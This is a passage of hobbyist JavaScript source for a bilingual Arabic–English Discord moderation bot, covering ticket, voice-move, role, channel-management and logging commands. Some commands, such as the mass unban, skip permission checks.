.addField(`Your invite codes in ${message.guild.name}`, `You currently don't have any active invites! Please create an invite and start inviting, then you will be able to see your codes here!`)
message.author.send({ embed: embed });
return;
} else {
    var embed = new Discord.RichEmbed()
.setColor("#000000")
.addField(`Your invite codes in ${message.guild.name}`, `Invite Codes:\n${codes.join("\n")}`)
message.author.send({ embed: embed });
return;
}
})
}

});


client.on('message', message => {
    if (message.content.startsWith("_new")) {
        const reason = message.content.split(" ").slice(1).join(" ");
        if (!message.guild.roles.exists("name", "Ticket Bot")) return message.channel.send(`This server doesn't have a \`Ticket Bot\` role made, so the ticket won't be opened.\nIf you are an administrator, make one with that name exactly and give it to users that should be able to see tickets.`);
        if (message.guild.channels.exists("name", "ticket-" + message.author.username + message.author.discriminator)) return message.channel.send(`You already have a ticket open.`);
        message.guild.createChannel(`ticket-${message.author.username + message.author.discriminator}`, "text").then(c => {
            let role = message.guild.roles.find("name", "Support Team");
            let role2 = message.guild.roles.find("name", "@everyone");
            c.overwritePermissions(role, {
                SEND_MESSAGES: true,
                READ_MESSAGES: true
            });
            c.overwritePermissions(role2, {
                SEND_MESSAGES: false,
                READ_MESSAGES: false
            });
            c.overwritePermissions(message.author, {
                SEND_MESSAGES: true,
                READ_MESSAGES: true
            });
            message.channel.send(`:white_check_mark: Your ticket has been created, #${c.name}.`);
            const embed = new Discord.RichEmbed()
                .setColor(0xCF40FA)
                .addField(`Hey ${message.author.username}!`, `Please try explain why you opened this ticket with as much detail as possible. Our **Support Staff** will be here soon to help.`)
                .setTimestamp();
            c.send({
                embed: embed
            });
        }).catch(console.error); 
    }


    if (message.content.startsWith("_close")) {
        if (!message.channel.name.startsWith(`ticket-`)) return message.channel.send(`You can't use the close command outside of a ticket channel.`);

        message.channel.send(`Are you sure? Once confirmed, you cannot reverse this action!\nTo confirm, type \`!close\`. This will time out in 10 seconds and be cancelled.`)
            .then((m) => {
                message.channel.awaitMessages(response => response.content === '!close', {
                        max: 1,
                        time: 10000,
                        errors: ['time'],
                    })
                    .then((collected) => {
                        message.channel.delete();
                    })
                    .catch(() => {
                        m.edit('Ticket close timed out, the ticket was not closed.').then(m2 => {
                            m2.delete();
                        }, 3000);
                    });
            });
    }

});

client.on("message", message => {
  let men = message.mentions.users.first();
  if(message.content.startsWith(prefix + 'vkick')) {
    try {
    if(!men) {
      message.channel.send("**Mention A Person**");
      return;
    }
    if(!message.guild.member(men).voiceChannel) return message.channel.send("The Person Not In A VoiceChannel");
    if(!message.member.hasPermission("MOVE_MEMBERS")) return message.channel.send("You Dont Have Permissions To Kick This Person")
    if(!message.guild.me.hasPermission("MOVE_MEMBERS")) return message.channel.send("The Bot Not Have Permissions To Kick This Person");
       if(!message.guild.me.hasPermission("MANAGE_CHANNELS")) return message.channel.send("I Dont Have Permissions To Create VoiceChannel")

    message.guild.createChannel("vKick", "voice").then(c => {
      message.guild.member(men).setVoiceChannel(c.id)
    setTimeout(() => {
      c.delete()
    }, 100)
    });
    message.channel.send(`**Has Been Kicked From The VoiceChannel \`\`${men.username}\`\`**`)
} catch (e) {
  message.channel.send("I Cant Do This For Permissions Or Something :/");
}
  }
});


client.on('message',message =>{
    var prefix = "_";
    if(message.content.startsWith(prefix + 'topinv')) {
  message.guild.fetchInvites().then(i =>{
  var invites = [];
   
  i.forEach(inv =>{
    var [invs,i]=[{},null];
     
    if(inv.maxUses){
        invs[inv.code] =+ inv.uses+"/"+inv.maxUses;
    }else{
        invs[inv.code] =+ inv.uses;
    }
        invites.push(`invite: ${inv.url} inviter: ${inv.inviter} \`${invs[inv.code]}\`;`);
   
  });
  var embed = new Discord.RichEmbed()
  .setColor("#000000")
  .setDescription(`${invites.join(`\n`)+'\n\n**By:** '+message.author}`)
  .setThumbnail("https://cdn.discordapp.com/attachments/442414506430169098/489929808244113409/JPEG_20180913_232108.jpg")
           message.channel.send({ embed: embed });
   
  });
   
    }
  });

client.on('message', message => {
    if (message.content === 'هاي') {
        message.reply('♪ هــأايات أطلـَـق ولكــم☆');
      }
});



client.on('message', message => {
    if (message.content === '....') {
        message.reply('♪أطلـَـق من نقط, يلــبى بس ☆');
      }
});


client.on('message', message => {
    if (message.content === '...') {
        message.reply('♪أطلـَـق من نقط, يلــبى بس ☆');
      }
});


client.on('message', message => {
    if (message.content === '..') {
        message.reply('♪أطلـَـق من نقط, يلــبى بس ☆');
      }
});

client.on('message', message => {
    if (message.content === '.') {
        message.reply('♪أطلـَـق من نقط, يلــبى بس ☆');
      }
});


client.on('message',async message => {
    var prefix = "_";
  let args = message.content.split(" ").slice(1).join(" ");
  let role = message.guild.roles.find('name',args) || message.guild.roles.get(args);


  if(message.content.startsWith(prefix + "grole")) {
    if(!args) return message.reply('اكتب اسم الرتبة');
    if(!role) return message.reply('هذه الرتبة غير موجودة');
    let iQp = new Discord.RichEmbed()
    .setAuthor(message.author.tag,message.author.avatarURL)
    .setTitle(message.guild.name)
    .setThumbnail(message.guild.iconURL)
    .addField('- اسم الرتبة',role.name,true)
    .addField('- اي دي الرتبة',role.id,true)
    .addField('- تم انشاء الرتبة',role.createdAt.toLocaleString(),true)
    .addField('- لون الرتبة',role.hexColor,true)
    .addField('- عدد الاعضاء الذي لديهم نفس الرتبة',role.members.size,true)
    .addField('- مركز الرتبة بين كل الرتب',role.position - message.guild.roles.size,true)
    .addField('- خصائص الرتبة',role.permissions,true)
    .setFooter(message.author.tag,message.author.avatarURL);

    message.channel.send(iQp);
  }
});


client.on('message', message => {
    if (message.content.startsWith("_bans")) {
        message.guild.fetchBans()
        .then(bans => message.channel.send(`${bans.size} عدد اشخاص المبندة من السيرفر `))
  .catch(console.error);
}
});



client.on('message', message => {
    if(message.content.startsWith(prefix + 'mvall')) {
	    if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!');
     if (!message.member.hasPermission("MOVE_MEMBERS")) return message.channel.send('**لايوجد لديك صلاحية سحب الأعضاء**');
       if(!message.guild.member(client.user).hasPermission("MOVE_MEMBERS")) return message.reply("**لايوجد لدي صلاحية السحب**");
    if (message.member.voiceChannel == null) return message.channel.send(`**الرجاء الدخول لروم صوتي**`)
     var author = message.member.voiceChannelID;
     var m = message.guild.members.filter(m=>m.voiceChannel)
     message.guild.members.filter(m=>m.voiceChannel).forEach(m => {
     m.setVoiceChannel(author)
     })
     message.channel.send(`**تم سحب جميع الأعضاء الي الروم الصوتي حقك.**`)


     }
       });


client.on('message',async message => {
if(message.content === '_unall') {
	if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!');
message.guild.fetchBans().then(ba => {
ba.forEach(ns => {
message.guild.unban(ns);
message.reply('Done ✅');
});
});
}
});


client.on('message', message => {
            if(message.author.bot) return; 
            if (message.content.startsWith("_contact")) {
            if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!');
            let args = message.content.split(" ").slice(1).join(' ');
            if(!args) return message.reply("**➥ Useage:** -contact Message");
            client.users.get("415595760990552065").send(
                "\n" + "**" + "● Server :" + "**" +
                "\n" + "**" + "» " + message.guild.name + "**" +
                "\n" + "**" + " ● By : " + "**" +
                "\n" + "**" + "» " + message.author.tag + "**" +
                "\n" + "**" + " ● Message : " + "**" +
                "\n" + "**" + args + "**")
            
            let embed = new Discord.RichEmbed()
            .setDescription(':mailbox_with_mail: Message have been sent')
            .setFooter(message.author.username, message.author.avatarURL)
            message.channel.sendEmbed(embed);
            
            }
            }); 


client.on('message', message => {
    if (message.author.bot) return;
    if(message.content == '_mb') {
	    if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!');
    const embed = new Discord.RichEmbed()
    .addField(`حالة الأعضاء🔋`,'-',   true)
.addField(`💚 اونلاين:   ${message.guild.members.filter(m=>m.presence.status == 'online').size}`,'-',   true)
.addField(`❤ مشغول:     ${message.guild.members.filter(m=>m.presence.status == 'dnd').size}`,'-',   true)
.addField(`💛 خامل:      ${message.guild.members.filter(m=>m.presence.status == 'idle').size}`,'-',   true)   
.addField(`🖤 اوفلاين:   ${message.guild.members.filter(m=>m.presence.status == 'offline').size}`,'-',  true) 
.addField(`💙   الكل:  ${message.guild.memberCount}`,'-',   true)         
         message.channel.send({embed});

    }
  });


client.on('message', function(message) {
 //xRGRx .. By Julian
    let args = message.content.split(" ").slice(1).join(" ");
    if(message.content.startsWith(prefix + "setname")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setUsername(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "stream")) {
		        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setGame(args , 'https://twitch.tv/JBot-Julian');
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "pplay")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setActivity(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "listen")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('��كت�� الحالة اللي تريدها.');
        client.user.setActivity(args, {type:'LISTENING'});
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "watch")) {
				        if(message.author.id !== myID) return;
            if(!args) return message.reply('اكتب الحالة اللي تريدها.');
        client.user.setActivity(args, {type:'WATCHING'});
        message.channel.send(':white_check_mark: Done!').then(msg => {
           msg.delete(5000);
          message.delete(5000);
        });
    } else if(message.content.startsWith(prefix + "setavatar")) {
				        if(message.author.id !== myID) return;
        client.user.setAvatar(args);
        message.channel.send(':white_check_mark: Done!').then(msg => {
                if(!args) return message.reply('اكتب الحالة اللي تريدها.');
           msg.delete(5000);
          message.delete(5000);
        });
    }
}); 



client.on("message", (message) => {
if (message.content.startsWith("_ct")) {
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply("You Don't Have `MANAGE_CHANNELS` Premissions ");
        let args = message.content.split(" ").slice(1);
    message.guild.createChannel(args.join(' '), 'text');
message.channel.sendMessage('تـم إنـشاء روم كـتابـي')

}
});


client.on("message", (message) => {
if (message.content.startsWith("_cv")) {
            if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply("You Don't Have `MANAGE_CHANNELS` Premissions ");
        let args = message.content.split(" ").slice(1);
    message.guild.createChannel(args.join(' '), 'voice');
    message.channel.sendMessage('تـم إنـشاء روم صـوتي')
    
}
});


client.on("message", message => {
    var prefix = "_"
    if (!message.content.startsWith(prefix)) return;
      let command = message.content.split(" ")[0];
      command = command.slice(prefix.length);
        if(command === "skin") {
                const args = message.content.split(" ").slice(1).join(" ")
        if (!args) return message.channel.send("** Type your skin name **");
        const image = new Discord.Attachment(`https://minotar.net/armor/body/${args}`, "skin.png");
    message.channel.send(image)
        }
    });


client.on("message", (message) => {
    if (message.content.startsWith('_delet')) {
        if (!message.member.hasPermission('MANAGE_CHANNELS')) return message.reply("You Don't Have `MANAGE_CHANNELS` Premissions ");

        let args = message.content.split(' ').slice(1);
        let channel = message.client.channels.find('name', args.join(' '));
        if (!channel) return message.reply('**There is no room like this name -_-**').catch(console.error);
        channel.delete()
    }
});  


client.on('message', message => {       
if (message.content.startsWith(prefix + 'clear')) { //xRGRx .. By Julian
	if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
		if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send(':no_entry: | You dont have **MANAGE_MESSAGES** Permission!');
        if(!message.guild.member(client.user).hasPermission('MANAGE_MESSAGES')) return message.channel.send(':no_entry: | I dont have **MANAGE_MESSAGES** Permission!');
 let args = message.content.split(" ").slice(1)
    let messagecount = parseInt(args);
    if (args > 99) return message.reply("**:octagonal_sign: || يجب ان يكون عدد المسح أقل من 100 .**").then(messages => messages.delete(5000))
    if(!messagecount) args = '100';
    message.channel.fetchMessages({limit: messagecount + 1}).then(messages => message.channel.bulkDelete(messages));
    message.channel.send(`\`${args}\` : __عدد الرسائل التي تم مسحها __ `).then(messages => messages.delete(5000));
  }
  });


client.on('message', message => {
          let args = message.content.split(' ').slice(1);
   if(message.content.split(' ')[0] == '_color'){
           const embedd = new Discord.RichEmbed()
     .setFooter('Requested by '+message.author.username, message.author.avatarURL)
   .setDescription(`**لا يوجد لون بهذا الأسم ** :x: `)
   .setColor(`ff0000`)

    if(!isNaN(args) && args.length > 0)
    

if    (!(message.guild.roles.find("name",`${args}`))) return  message.channel.sendEmbed(embedd);


       var a = message.guild.roles.find("name",`${args}`)
                if(!a)return;
const embed = new Discord.RichEmbed()
                    
     .setFooter('Requested by '+message.author.username, message.author.avatarURL)
   .setDescription(`**Done , تم تغير لونك . :white_check_mark: **`)
 
   .setColor(`${a.hexColor}`)
  message.channel.sendEmbed(embed);
          if (!args)return;
setInterval(function(){})
                  let count = 0;
                  let ecount = 0;
        for(let x = 1; x < 201; x++){
           
            message.member.removeRole(message.guild.roles.find("name",`${x}`))
          
            }
                message.member.addRole(message.guild.roles.find("name",`${args}`));
        
            
    }
});


client.on('message', message => {


if (message.content === prefix + "lock") {
if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
        if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send(':no_entry: | You dont have **MANAGE_MESSAGES** Permission!');
        if(!message.guild.member(client.user).hasPermission('MANAGE_MESSAGES')) return message.channel.send(':no_entry: | I dont have **MANAGE_MESSAGES** Permission!');
           message.channel.overwritePermissions(message.guild.id, {
         READ_MESSAGES: false

           }).then(() => {
               message.reply("Channel Locked ✅ ")
           });
}
  if (message.content === prefix + "unlock") {
if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!'); 
        if(!message.member.hasPermission('MANAGE_MESSAGES')) return message.channel.send(':no_entry: | You dont have **MANAGE_MESSAGES** Permission!');
        if(!message.guild.member(client.user).hasPermission('MANAGE_MESSAGES')) return message.channel.send(':no_entry: | I dont have **MANAGE_MESSAGES** Permission!');
           message.channel.overwritePermissions(message.guild.id, {
         READ_MESSAGES: true

           }).then(() => {
               message.reply("Channel UnLocked ✅ ")
           });
}
  

});


  client.on('message', message => {
  if (!message.guild) return;

  if (message.content === 'jjoin') {
	   if (message.author.id !== '415595760990552065') return message.reply(':no_entry: | This Command Only For Minato :fire: !')
 if(!message.author.id === '415595760990552065') return;
    if (message.member.voiceChannel) {
      message.member.voiceChannel.join()
        .then(connection => { 
          message.reply('لقد دخلت الروم بنجاح !');
        })
        .catch(console.log);
    } else {
      message.reply('يجب ان تكون في روم صوتي');
    }
  }
});


  client.on('message', message => {
            
let args = message.content.split(' ').slice(1).join(' ');
if (message.content.startsWith('_sbcall')){
	  if(!message.channel.guild) return message.reply(':no_entry: | This Command For Servers Only!');
 if (message.author.id !== '415595760990552065') return message.reply(':no_entry: | This Command Only For Bot Owner!')
 if(!message.author.id === '415595760990552065') return;
message.channel.sendMessage('جار ارسال الرسالة |✅')
client.users.forEach(m =>{
m.sendMessage(args)
})
}
});


client.on('error', console.error);

client.on('messageDelete', message => {
	if(message.author.bot) return;
	if(message.channel.type === 'dm') return;
	if(!message.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!message.guild.member(client.user).hasPermission('MANAGE_MESSAGES')) return;

	var logChannel = message.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	let messageDelete = new Discord.RichEmbed()
	.setTitle('**[MESSAGE DELETE]**')
	.setColor('RED')
	.setThumbnail(message.author.avatarURL)
	.setDescription(`**\n**:wastebasket: Successfully \`\`DELETE\`\` **MESSAGE** In ${message.channel}\n\n**Channel:** \`\`${message.channel.name}\`\` (ID: ${message.channel.id})\n**Message ID:** ${message.id}\n**Sent By:** <@${message.author.id}> (ID: ${message.author.id})\n**Message:**\n\`\`\`${message}\`\`\``)
	.setTimestamp()
	.setFooter(message.guild.name, message.guild.iconURL)

	logChannel.send(messageDelete);
});
client.on('messageUpdate', (oldMessage, newMessage) => {

	if(oldMessage.author.bot) return;
	if(!oldMessage.channel.type === 'dm') return;
	if(!oldMessage.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!oldMessage.guild.member(client.user).hasPermission('MANAGE_MESSAGES')) return;

	var logChannel = oldMessage.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	if(oldMessage.content.startsWith('https://')) return;

	let messageUpdate = new Discord.RichEmbed()
	.setTitle('**[MESSAGE EDIT]**')
	.setThumbnail(oldMessage.author.avatarURL)
	.setColor('BLUE')
	.setDescription(`**\n**:wrench: Successfully \`\`EDIT\`\` **MESSAGE** In ${oldMessage.channel}\n\n**Channel:** \`\`${oldMessage.channel.name}\`\` (ID: ${oldMessage.channel.id})\n**Message ID:** ${oldMessage.id}\n**Sent By:** <@${oldMessage.author.id}> (ID: ${oldMessage.author.id})\n\n**Old Message:**\`\`\`${oldMessage}\`\`\`\n**New Message:**\`\`\`${newMessage}\`\`\``)
	.setTimestamp()
	.setFooter(oldMessage.guild.name, oldMessage.guild.iconURL)

	logChannel.send(messageUpdate);
});


// Roles Logs
client.on('roleCreate', role => {

	if(!role.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!role.guild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = role.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	role.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		let roleCreate = new Discord.RichEmbed()
		.setTitle('**[ROLE CREATE]**')
		.setThumbnail(userAvatar)
		.setDescription(`**\n**:white_check_mark: Successfully \`\`CREATE\`\` Role.\n\n**Role Name:** \`\`${role.name}\`\` (ID: ${role.id})\n**By:** <@${userID}> (ID: ${userID})`)
		.setColor('GREEN')
		.setTimestamp()
		.setFooter(role.guild.name, role.guild.iconURL)

		logChannel.send(roleCreate);
	})
});
client.on('roleDelete', role => {

	if(!role.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!role.guild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = role.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	role.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		let roleDelete = new Discord.RichEmbed()
		.setTitle('**[ROLE DELETE]**')
		.setThumbnail(userAvatar)
		.setDescription(`**\n**:white_check_mark: Successfully \`\`DELETE\`\` Role.\n\n**Role Name:** \`\`${role.name}\`\` (ID: ${role.id})\n**By:** <@${userID}> (ID: ${userID})`)
		.setColor('RED')
		.setTimestamp()
		.setFooter(role.guild.name, role.guild.iconURL)

		logChannel.send(roleDelete);
	})
});
client.on('roleUpdate', (oldRole, newRole) => {

	if(!oldRole.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!oldRole.guild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = oldRole.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	oldRole.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		if(oldRole.name !== newRole.name) {
			let roleUpdateName = new Discord.RichEmbed()
			.setTitle('**[ROLE NAME UPDATE]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:white_check_mark: Successfully \`\`EDITED\`\` Role Name.\n\n**Old Name:** \`\`${oldRole.name}\`\`\n**New Name:** \`\`${newRole.name}\`\`\n**Role ID:** ${oldRole.id}\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldRole.guild.name, oldRole.guild.iconURL)

			logChannel.send(roleUpdateName);
		}
		if(oldRole.hexColor !== newRole.hexColor) {
			if(oldRole.hexColor === '#000000') {
				var oldColor = '`Default`';
			}else {
				var oldColor = oldRole.hexColor;
			}
			if(newRole.hexColor === '#000000') {
				var newColor = '`Default`';
			}else {
				var newColor = newRole.hexColor;
			}
			let roleUpdateColor = new Discord.RichEmbed()
			.setTitle('**[ROLE COLOR UPDATE]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:white_check_mark: Successfully \`\`EDITED\`\` **${oldRole.name}** Role Color.\n\n**Old Color:** ${oldColor}\n**New Color:** ${newColor}\n**Role ID:** ${oldRole.id}\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldRole.guild.name, oldRole.guild.iconURL)

			logChannel.send(roleUpdateColor);
		}
		if(oldRole.permissions !== newRole.permissions) {
			let roleUpdate = new Discord.RichEmbed()
			.setTitle('**[UPDATE ROLE PERMISSIONS]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:first_place: Successfully \`\`CHANGED\`\` **${oldRole.name}** Permissions!\n\n**Old Permissions:** \`\`${oldRole.permissions}\`\`\n**New Permissions:** \`\`${newRole.permissions}\`\`\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldRole.guild.name, oldRole.guild.iconURL)
			
			logChannel.send(roleUpdate)
		}
	})
});


// Channels Log
client.on('channelCreate', channel => {

	if(!channel.guild) return;
	if(!channel.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!channel.guild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = channel.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	if(channel.type === 'text') {
		var roomType = 'Text';
	}else
	if(channel.type === 'voice') {
		var roomType = 'Voice';
	}else
	if(channel.type === 'category') {
		var roomType = 'Category';
	}

	channel.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		let channelCreate = new Discord.RichEmbed()
		.setTitle('**[CHANNEL CREATE]**')
		.setThumbnail(userAvatar)
		.setDescription(`**\n**:white_check_mark: Successfully \`\`CREATE\`\` **${roomType}** channel.\n\n**Channel Name:** \`\`${channel.name}\`\` (ID: ${channel.id})\n**By:** <@${userID}> (ID: ${userID})`)
		.setColor('GREEN')
		.setTimestamp()
		.setFooter(channel.guild.name, channel.guild.iconURL)

		logChannel.send(channelCreate);
	})
});
client.on('channelDelete', channel => {
	if(!channel.guild) return;
	if(!channel.guild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!channel.guild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = channel.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	if(channel.type === 'text') {
		var roomType = 'Text';
	}else
	if(channel.type === 'voice') {
		var roomType = 'Voice';
	}else
	if(channel.type === 'category') {
		var roomType = 'Category';
	}

	channel.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		let channelDelete = new Discord.RichEmbed()
		.setTitle('**[CHANNEL DELETE]**')
		.setThumbnail(userAvatar)
		.setDescription(`**\n**:white_check_mark: Successfully \`\`DELETE\`\` **${roomType}** channel.\n\n**Channel Name:** \`\`${channel.name}\`\` (ID: ${channel.id})\n**By:** <@${userID}> (ID: ${userID})`)
		.setColor('RED')
		.setTimestamp()
		.setFooter(channel.guild.name, channel.guild.iconURL)

		logChannel.send(channelDelete);
	})
});
client.on('channelUpdate', (oldChannel, newChannel) => {
	if(!oldChannel.guild) return;

	var logChannel = oldChannel.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	if(oldChannel.type === 'text') {
		var channelType = 'Text';
	}else
	if(oldChannel.type === 'voice') {
		var channelType = 'Voice';
	}else
	if(oldChannel.type === 'category') {
		var channelType = 'Category';
	}

	oldChannel.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		if(oldChannel.name !== newChannel.name) {
			let newName = new Discord.RichEmbed()
			.setTitle('**[CHANNEL EDIT]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:wrench: Successfully Edited **${channelType}** Channel Name\n\n**Old Name:** \`\`${oldChannel.name}\`\`\n**New Name:** \`\`${newChannel.name}\`\`\n**Channel ID:** ${oldChannel.id}\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldChannel.guild.name, oldChannel.guild.iconURL)

			logChannel.send(newName);
		}
		if(oldChannel.topic !== newChannel.topic) {
			let newTopic = new Discord.RichEmbed()
			.setTitle('**[CHANNEL EDIT]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:wrench: Successfully Edited **${channelType}** Channel Topic\n\n**Old Topic:**\n\`\`\`${oldChannel.topic || 'NULL'}\`\`\`\n**New Topic:**\n\`\`\`${newChannel.topic || 'NULL'}\`\`\`\n**Channel:** ${oldChannel} (ID: ${oldChannel.id})\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldChannel.guild.name, oldChannel.guild.iconURL)

			logChannel.send(newTopic);
		}
	})
});


// Guild Logs
client.on('guildUpdate', (oldGuild, newGuild) => {

	if(!oldGuild.member(client.user).hasPermission('EMBED_LINKS')) return;
	if(!oldGuild.member(client.user).hasPermission('VIEW_AUDIT_LOG')) return;

	var logChannel = oldGuild.channels.find(c => c.id === guildSettings[oldGuild.id].logChannel);
	if(!logChannel) return;

	oldGuild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;

		if(oldGuild.name !== newGuild.name) {
			let guildName = new Discord.RichEmbed()
			.setTitle('**[CHANGE GUILD NAME]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:white_check_mark: Successfully \`\`EDITED\`\` The guild name.\n\n**Old Name:** \`\`${oldGuild.name}\`\`\n**New Name:** \`\`${newGuild.name}\`\`\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(newGuild.name, oldGuild.iconURL)

			logChannel.send(guildName)
		}
		if(oldGuild.region !== newGuild.region) {
			let guildRegion = new Discord.RichEmbed()
			.setTitle('**[CHANGE GUILD REGION]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:white_check_mark: Successfully \`\`EDITED\`\` The guild region.\n\n**Old Region:** ${oldGuild.region}\n**New Region:** ${newGuild.region}\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldGuild.name, oldGuild.iconURL)

			logChannel.send(guildRegion);
		}
		if(oldGuild.verificationLevel !== newGuild.verificationLevel) {
			if(oldGuild.verificationLevel === 0) {
				var oldVerLvl = 'Very Easy';
			}else
			if(oldGuild.verificationLevel === 1) {
				var oldVerLvl = 'Easy';
			}else
			if(oldGuild.verificationLevel === 2) {
				var oldVerLvl = 'Medium';
			}else
			if(oldGuild.verificationLevel === 3) {
				var oldVerLvl = 'Hard';
			}else
			if(oldGuild.verificationLevel === 4) {
				var oldVerLvl = 'Very Hard';
			}

			if(newGuild.verificationLevel === 0) {
				var newVerLvl = 'Very Easy';
			}else
			if(newGuild.verificationLevel === 1) {
				var newVerLvl = 'Easy';
			}else
			if(newGuild.verificationLevel === 2) {
				var newVerLvl = 'Medium';
			}else
			if(newGuild.verificationLevel === 3) {
				var newVerLvl = 'Hard';
			}else
			if(newGuild.verificationLevel === 4) {
				var newVerLvl = 'Very Hard';
			}

			let verLog = new Discord.RichEmbed()
			.setTitle('**[GUILD VERIFICATION LEVEL CHANGE]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:white_check_mark: Successfully \`\`EDITED\`\` Guild verification level.\n\n**Old Verification Level:** ${oldVerLvl}\n**New Verification Level:** ${newVerLvl}\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldGuild.name, oldGuild.iconURL)

			logChannel.send(verLog);
		}
	})
});
client.on('guildMemberUpdate', (oldMember, newMember) => {
	var logChannel = oldMember.guild.channels.find(c => c.name === 'log');
	if(!logChannel) return;

	oldMember.guild.fetchAuditLogs().then(logs => {
		var userID = logs.entries.first().executor.id;
		var userAvatar = logs.entries.first().executor.avatarURL;
		var userTag = logs.entries.first().executor.tag;

		if(oldMember.nickname !== newMember.nickname) {
			if(oldMember.nickname === null) {
				var oldNM = '\`\`اسمه الاصلي\`\`';
			}else {
				var oldNM = oldMember.nickname;
			}
			if(newMember.nickname === null) {
				var newNM = '\`\`اسمه الاصلي\`\`';
			}else {
				var newNM = newMember.nickname;
			}

			let updateNickname = new Discord.RichEmbed()
			.setTitle('**[UPDATE MEMBER NICKNAME]**')
			.setThumbnail(userAvatar)
			.setColor('BLUE')
			.setDescription(`**\n**:spy: Successfully \`\`CHANGE\`\` Member Nickname.\n\n**User:** ${oldMember} (ID: ${oldMember.id})\n**Old Nickname:** ${oldNM}\n**New Nickname:** ${newNM}\n**By:** <@${userID}> (ID: ${userID})`)
			.setTimestamp()
			.setFooter(oldMember.guild.name, oldMember.guild.iconURL)

			logChannel.send(updateNickname);
		}
		if(oldMember.roles.size < newMember.roles.size) {
			let role = newMember.roles.filter(r => !oldMember.roles.has(r.id)).first();

			let roleAdded = new Discord.RichEmbed()
			.setTitle('**[ADDED ROLE TO MEMBER]**')
			.setThumbnail(oldMember.guild.iconURL)
			.setColor('GREEN')
